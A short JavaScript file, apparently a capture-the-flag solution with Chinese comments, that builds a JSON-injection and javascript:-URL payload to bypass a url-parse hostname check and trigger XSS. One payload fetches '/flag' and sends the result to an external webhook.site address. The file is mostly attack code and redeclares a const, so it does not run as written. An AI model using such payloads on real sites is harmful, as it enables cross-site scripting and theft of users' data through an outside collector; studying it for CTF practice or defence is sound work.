const parse = require('url-parse');
// 真的很牛逼一道题 
// json.parse的使用
// starbucks 反射xss的融入
// javasctipt协议
    // const blog ='http://web-noob.kr","username":"hello'
    const blog ='javascript://web-noob.kr/%0A","username":"hello';
    const blog = 'javascript://web-noob.kr/%250Afetch(`/flag`).then(function(response){return response.text();}).then(function(data){return fetch(`https://webhook.site/755692af-2857-4a55-ba47-12129421ee9f?Flag=${encodeURIComponent(data)}`);});","username":"hello'
    const user = JSON.parse(`{"username":"Tester", "setblog":"${blog}"}`);
    const url = parse(user['setblog'], true)
    , hostname = url.hostname;
console.log(user,url)

    if ((hostname === 'web-noob.kr' && user['username'] === 'hello') || (hostname === 'web-noob.kr' && username === 'world')) {
        console.log(1)
        
    } else {
        console.log(2)
    }